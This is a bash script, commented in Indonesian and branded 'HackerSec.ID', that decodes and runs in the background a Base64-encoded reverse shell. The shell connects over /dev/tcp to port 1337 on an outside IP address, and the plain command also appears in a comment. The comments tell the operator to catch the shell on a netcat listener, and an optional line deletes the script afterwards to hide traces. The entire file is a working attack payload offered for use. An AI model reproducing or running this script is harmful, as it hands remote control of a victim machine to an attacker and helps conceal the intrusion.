#!/bin/bash

# ==========================================================
# HackerSec.ID Reverse Shell Payload
# Target IP: 114.10.156.36
# Target Port: 1337
# ==========================================================

echo "[HackerSec] Initiating reverse shell attempt..."

# Payload reverse shell di-encode Base64 untuk menghindari masalah karakter
# Payload asli: bash -i >& /dev/tcp/114.10.156.36/1337 0>&1
BASE64_SHELL="YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTAuMTU2LjM2LzEzMzcgMD4mMQ=="

# Coba dekode dan jalankan payload
echo "[HackerSec] Decoding and executing reverse shell payload..."
echo "${BASE64_SHELL}" | base64 -d | bash &

# & di akhir perintah bash akan membuat proses berjalan di background.
# Ini penting agar script utama bisa selesai dan tidak hang,
# meskipun shell belum tentu interaktif langsung di konsol exploit.
# Kamu akan mendapatkan shell interaktif di listener netcat kamu.

echo "[HackerSec] Reverse shell command sent. Check your netcat listener on 114.10.156.36:1337!"

# Opsional: Jika kamu ingin menambahkan sedikit jeda setelah mengirim payload
# sleep 2

# Opsional: Hapus script ini dari target untuk sedikit membersihkan jejak
# rm -- "$0" &>/dev/null
